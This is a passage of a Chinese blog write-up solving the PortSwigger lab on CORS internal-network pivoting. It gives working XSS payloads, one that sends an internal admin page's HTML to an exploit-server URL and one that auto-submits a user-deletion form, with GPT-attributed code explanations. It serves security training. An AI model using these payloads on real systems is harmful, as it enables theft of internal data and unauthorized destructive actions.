<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512092320370.png" alt="image-20230512092320370"></p>
<p>检查日志或Collaborator交互组件，并查看发送给它的代码参数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512092341858.png" alt="image-20230512092341858"></p>
<p>发现: 192.168.0.175:8080</p>
<p>part2:</p>
<p>重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为从协作者交互中检索到的IP地址和端口号。不要忘记添加Collaborator有效负载或再次利用服务器URL。更新并提供漏洞利用。</p>
<pre><code class="hljs js">&lt;script&gt;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">xss</span>(<span class="hljs-params">url, text, vector</span>) {
	location = url + <span class="hljs-string">'/login?time='</span>+<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()+<span class="hljs-string">'&amp;username='</span>+<span class="hljs-built_in">encodeURIComponent</span>(vector)+<span class="hljs-string">'&amp;password=test&amp;csrf='</span>+text.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/csrf" value="([^"]+)"/</span>)[<span class="hljs-number">1</span>];
}
 
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUrl</span>(<span class="hljs-params">url, collaboratorURL</span>){
	<span class="hljs-title function_">fetch</span>(url).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-title function_">text</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> {
		<span class="hljs-title function_">xss</span>(url, text, <span class="hljs-string">'"&gt;&lt;img src='</span>+collaboratorURL+<span class="hljs-string">'?foundXSS=1&gt;'</span>);
	}))
}
 
<span class="hljs-title function_">fetchUrl</span>(<span class="hljs-string">"http://192.168.0.175:8080"</span>, <span class="hljs-string">"http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net/"</span>);
&lt;/script&gt;</code></pre>
<pre><code class="hljs plaintext">代码解析：GPT回答
解析：

1.定义了一个 xss(url, text, vector) 函数，用于执行 XSS 攻击。

2.构造了一个带有恶意 XSS 脚本的 URL，该 URL 包含了目标网站的登录页面地址、时间戳、恶意用户名和密码、以及来自目标网站的 CSRF 令牌。

3.将当前页面的 location 设置为构造的恶意 URL，从而实现跳转和注入恶意脚本的目的。

4.定义了一个 fetchUrl(url, collaboratorURL) 函数，用于发送异步请求获取目标 URL 的响应内容，并触发 XSS 攻击。

5.使用 fetch 函数发送一个 GET 请求到目标 URL，并获取响应的文本内容。

6.在响应返回时，将目标 URL、响应文本和恶意向量作为参数传递给 xss 函数，以触发 XSS 攻击。

7.调用 fetchUrl 函数，传递目标 URL 和协作者 URL 作为参数，以发起异步请求并触发 XSS 攻击。

这段代码的目的是通过发送异步请求来获取目标网站的响应内容，并在响应内容中注入恶意的 XSS 脚本代码。通过构造恶意的登录 URL，并将当前页面的 location 设置为该 URL，当用户访问该页面时，恶意的 XSS 脚本将执行并在用户的浏览器上执行攻击者所期望的操作。</code></pre>
<p>现在我们将探测用户名字段中的XSS漏洞。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512093905416.png" alt="image-20230512093905416"></p>
<p>检索URL中具有foundXSS=1的Collaborator交互；或者在日志中看到foundXSS=1</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512094256644.png" alt="image-20230512094256644"></p>
<p>part3:</p>
<p>重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为与步骤2中相同的IP地址和端口号，再次添加Collaborator有效负载或漏洞利用服务器。更新并提供漏洞利用</p>
<pre><code class="hljs js">&lt;script&gt;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">xss</span>(<span class="hljs-params">url, text, vector</span>) {
	location = url + <span class="hljs-string">'/login?time='</span>+<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()+<span class="hljs-string">'&amp;username='</span>+<span class="hljs-built_in">encodeURIComponent</span>(vector)+<span class="hljs-string">'&amp;password=test&amp;csrf='</span>+text.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/csrf" value="([^"]+)"/</span>)[<span class="hljs-number">1</span>];
}
 
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUrl</span>(<span class="hljs-params">url, collaboratorURL</span>){
	<span class="hljs-title function_">fetch</span>(url).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.<span class="hljs-title function_">text</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span>=&gt;</span>
	{
		<span class="hljs-title function_">xss</span>(url, text, <span class="hljs-string">'"&gt;&lt;iframe src=/admin onload="new Image().src=\''</span>+collaboratorURL+<span class="hljs-string">'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)"&gt;'</span>);
	}
	))
}
 
<span class="hljs-title function_">fetchUrl</span>(<span class="hljs-string">"http://192.168.0.175:8080"</span>, <span class="hljs-string">"http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net/"</span>);
&lt;/script&gt;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512094430574.png" alt="image-20230512094430574"></p>
<p>Collaborator交互或利用服务器日志会提供管理页面的源代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512094539843.png" alt="image-20230512094539843"></p>
<p>part4：</p>
<p>检索源代码，会注意到有一个允许删除用户的表单。重新在利用漏洞攻击服务器中输入以下代码。将$ip替换为相同的IP地址和端口号。</p>
<pre><code class="hljs js"><span class="hljs-comment">//  源代码</span>
 &lt;script src=<span class="hljs-string">"/resources/labheader/js/labHeader.js"</span>&gt;&lt;/script&gt;
            <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"academyLabHeader"</span>&gt;</span></span>
<span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">section</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"academyLabBanner"</span>&gt;</span></span>
<span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span></span>
<span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logo"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
<span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"title-container"</span>&gt;</span></span>
<span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>CORS vulnerability with internal network pivot attack<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span>
<span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"exploit-link"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"button"</span> <span class="hljs-attr">target</span>=<span class="hljs-string">"_blank"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"http://exploit-0a3f00c203b3ea2480b9112e01ce00d9.exploit-server.net"</span>&gt;</span>Go to exploit server<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span>
<span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"link-back"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack"</span>&gt;</span></span>
<span class="language-xml">                        Back<span class="hljs-symbol">&amp;nbsp;</span>to<span class="hljs-symbol">&amp;nbsp;</span>lab<span class="hljs-symbol">&amp;nbsp;</span>description<span class="hljs-symbol">&amp;nbsp;</span></span>
<span class="language-xml">                        <span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"1.1"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"Layer_1"</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">"http://www.w3.org/2000/svg"</span> <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">"http://www.w3.org/1999/xlink"</span> <span class="hljs-attr">x</span>=<span class="hljs-string">"0px"</span> <span class="hljs-attr">y</span>=<span class="hljs-string">"0px"</span> <span class="hljs-attr">viewBox</span>=<span class="hljs-string">"0 0 28 30"</span> <span class="hljs-attr">enable-background</span>=<span class="hljs-string">"new 0 0 28 30"</span> <span class="hljs-attr">xml:space</span>=<span class="hljs-string">"preserve"</span> <span class="hljs-attr">title</span>=<span class="hljs-string">"back-arrow"</span>&gt;</span></span>
<span class="language-xml">                            <span class="hljs-tag">&lt;<span class="hljs-name">g</span>&gt;</span></span>
<span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">polygon</span> <span class="hljs-attr">points</span>=<span class="hljs-string">"1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">polygon</span>&gt;</span></span>
<span class="language-xml">                                <span class="hljs-tag">&lt;<span class="hljs-name">polygon</span> <span class="hljs-attr">points</span>=<span class="hljs-string">"14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">polygon</span>&gt;</span></span>
<span class="language-xml">                            <span class="hljs-tag">&lt;/<span class="hljs-name">g</span>&gt;</span></span>
<span class="language-xml">                        <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span>
<span class="language-xml">                    <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span>
<span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
<span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"widgetcontainer-lab-status is-notsolved"</span>&gt;</span></span>
<span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>LAB<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>
<span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Not solved<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>
<span class="language-xml">                    <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"lab-status-icon"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span></span>
<span class="language-xml">                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
<span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
<span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">section</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    

        &lt;div theme=""&gt;
            &lt;section class="maincontainer"&gt;
                &lt;div class="container is-page"&gt;
                    &lt;header class="navigation-header"&gt;
                        &lt;section class="top-links"&gt;
                            &lt;a href="/"&gt;Home&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
                            &lt;a href="/admin"&gt;Admin panel&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
                            &lt;a href="/my-account?id=administrator"&gt;My account&lt;/a&gt;&lt;p&gt;|&lt;/p&gt;
                        &lt;/section&gt;
                    &lt;/header&gt;
                    &lt;header class="notification-header"&gt;
                    &lt;/header&gt;
                    &lt;form style="margin-top: 1em" class="login-form" action="/admin/delete" method="POST"&gt;
                        &lt;input required="" type="hidden" name="csrf" value="Mn2Dj8wVciUoD89vrl36Io4lkfpFQQG0"&gt;
                        &lt;label&gt;Username&lt;/label&gt;
                        &lt;input required="" type="text" name="username"&gt;
                        &lt;button class="button" type="submit"&gt;Delete user&lt;/button&gt;
                    &lt;/form&gt;
                &lt;/div&gt;
            &lt;/section&gt;
        &lt;/div&gt;
    

 HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"</code></pre>
<pre><code class="hljs js"><span class="hljs-comment">//  脚本</span>
&lt;script&gt;
<span class="hljs-keyword">function</span> <span class="hljs-title function_">xss</span>(<span class="hljs-params">url, text, vector</span>) {
	location = url + <span class="hljs-string">'/login?time='</span>+<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()+<span class="hljs-string">'&amp;username='</span>+<span class="hljs-built_in">encodeURIComponent</span>(vector)+<span class="hljs-string">'&amp;password=test&amp;csrf='</span>+text.<span class="hljs-title function_">match</span>(<span class="hljs-regexp">/csrf" value="([^"]+)"/</span>)[<span class="hljs-number">1</span>];
}
 
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUrl</span>(<span class="hljs-params">url</span>){
	<span class="hljs-title function_">fetch</span>(url).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">r</span>=&gt;</span>r.<span class="hljs-title function_">text</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span>=&gt;</span>
	{
	<span class="hljs-title function_">xss</span>(url, text, <span class="hljs-string">'"&gt;&lt;iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()"&gt;'</span>);
	}
	))
}
 
<span class="hljs-title function_">fetchUrl</span>(<span class="hljs-string">"http://192.168.0.175:8080"</span>);
&lt;/script&gt;</code></pre>
<pre><code class="hljs plaintext">代码解析：GPT回答
解析：

1.定义了一个 xss(url, text, vector) 函数，用于执行 XSS 攻击。

2.构造了一个带有恶意 XSS 脚本的 URL，该 URL 包含了目标网站的登录页面地址、时间戳、恶意用户名和密码、以及来自目标网站的 CSRF 令牌。

3.将当前页面的 location 设置为构造的恶意 URL，从而实现跳转和注入恶意脚本的目的。

4.定义了一个 fetchUrl(url) 函数，用于发送异步请求获取目标 URL 的响应内容，并触发 XSS 攻击。

5.使用 fetch 函数发送一个 GET 请求到目标 URL，并获取响应的文本内容。

6.在响应返回时，将目标 URL、响应文本和恶意向量作为参数传递给 xss 函数，以触发 XSS 攻击。

7.在构造恶意向量时，使用了一个包含 &lt;iframe&gt; 元素的恶意 XSS 脚本代码。该 &lt;iframe&gt; 元素的 src 属性设置为 /admin，并在加载完成时触发一个 JavaScript 代码，该代码会找到目标页面中的表单，将用户名字段（如果存在）设置为 'carlos'，然后自动提交表单。

8.调用 fetchUrl 函数，传递目标 URL 作为参数，以发起异步请求并触发 XSS 攻击。

这段代码的目的是通过发送异步请求来获取目标网站的响应内容，并在响应内容中注入恶意的 XSS 脚本代码。通过构造恶意的登录 URL，并将当前页面的 location 设置为该 URL，当用户访问该页面时，恶意的 XSS 脚本将执行并在用户的浏览器上执行攻击者所期望的操作。</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512094948032.png" alt="image-20230512094948032"></p>
<p>代码通过注入一个指向/admin页面的iframe提交表单以删除carlos</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230512095046927.png" alt="image-20230512095046927"></p>
<p>详情参考: <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53079406/article/details/128696923?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_53079406/article/details/128696923?spm=1001.2014.3001.5502</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2023/07/26/cors-kua-yu-lou-dong/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2023/07/26/cors-kua-yu-lou-dong/')">CORS跨域漏洞</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2023/07/26/cors-kua-yu-lou-dong/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=CORS跨域漏洞&amp;url=http://hybcx.xyz/2023/07/26/cors-kua-yu-lou-dong/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"></div></div></div><div class="post_share"><div class="social-share" data-image="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/07/26/qian-xi-ssrf-lou-dong/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">ssrf漏洞总结</div></div></a></div><div class="next-post pull-right"><a href="/2023/07/27/disabled-button/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">攻防世界-disabled_button</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="card-widget anzhiyu-right-widget" id="card-wechat" onclick="null"><div id="flip-wrapper"><div id="flip-content"><div class="face" style="background: url(https://bu.dusays.com/2023/01/13/63c02edf44033.png) center center / 100% no-repeat"></div><div class="back face" style="background: url(https://bu.dusays.com/2023/05/13/645fa415e8694.png) center center / 100% no-repeat"></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#cors%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">CORS跨域漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 漏洞简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5"><span class="toc-number">1.1.1.</span> <span class="toc-text">同源策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E5%9F%9F%E8%AE%BF%E9%97%AE%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9C%BA%E6%99%AF"><span class="toc-number">1.1.2.</span> <span class="toc-text">跨域访问的一些场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E5%9F%9F%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.3.</span> <span class="toc-text">跨域请求方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-cors%E8%B7%A8%E5%9F%9F%E5%8E%9F%E7%90%86%E5%8F%8A%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 CORS跨域原理及漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-cors%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 CORS漏洞攻击流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E4%BF%AE%E5%A4%8D%E5%8F%8A%E9%98%B2%E5%BE%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 修复及防御方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E7%AE%80%E5%8D%95%E8%AF%B7%E6%B1%82%E7%9A%84%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.5.</span> <span class="toc-text">0x05 简单请求的示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.</span> <span class="toc-text">0x06 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x07-%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0%E6%8A%80%E5%B7%A7"><span class="toc-number">1.7.</span> <span class="toc-text">0x07 漏洞发现技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%B8%80-burpsuite"><span class="toc-number">1.7.0.0.1.</span> <span class="toc-text">方式一: BurpSuite</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%BA%8C-access-control-allow-origin"><span class="toc-number">1.7.0.0.2.</span> <span class="toc-text">方式二: Access-Control-Allow-Origin：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%B8%89-%E4%BD%BF%E7%94%A8corscanner%E5%B7%A5%E5%85%B7%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E6%89%AB%E6%8F%8F"><span class="toc-number">1.7.0.0.3.</span> <span class="toc-text">方式三: 使用CORScanner工具(漏洞自动化扫描)</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x08-%E5%85%B6%E4%BB%96%E5%8F%AF%E8%83%BD%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="toc-number">1.8.</span> <span class="toc-text">0x08 其他可能利用漏洞的地方</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#81-%E8%A7%A3%E6%9E%90origin%E5%A4%B4%E6%97%B6%E5%87%BA%E9%94%99"><span class="toc-number">1.8.0.1.</span> <span class="toc-text">8.1 解析Origin头时出错</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#82-%E5%88%A9%E7%94%A8%E7%9B%B8%E4%BA%92%E5%8F%97cors%E4%BF%A1%E4%BB%BB%E7%9A%84%E5%9F%9F%E6%9D%A5%E8%BF%9B%E8%A1%8Cxss"><span class="toc-number">1.8.0.2.</span> <span class="toc-text">8.2 利用相互受CORS信任的域来进行XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#83-%E7%99%BD%E5%90%8D%E5%8D%95%E4%B8%AD%E7%9A%84null%E5%80%BC"><span class="toc-number">1.8.0.3.</span> <span class="toc-text">8.3 白名单中的null值</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x09-%E5%88%A9%E7%94%A8cors%E6%BC%8F%E6%B4%9E%E5%81%8F%E5%AE%9E%E9%99%85%E7%8E%AF%E5%A2%83"><span class="toc-number">1.9.</span> <span class="toc-text">0x09 利用CORS漏洞(偏实际环境)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B9%E5%BC%8F%E4%B8%80%E5%AD%98%E5%9C%A8%E7%94%A8%E6%88%B7%E5%87%AD%E8%AF%81"><span class="toc-number">1.9.0.1.</span> <span class="toc-text">方式一：存在用户凭证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12-bp%E5%AE%98%E7%BD%91%E7%9A%84%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0"><span class="toc-number">1.10.</span> <span class="toc-text">0x12 bp官网的靶场练习</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 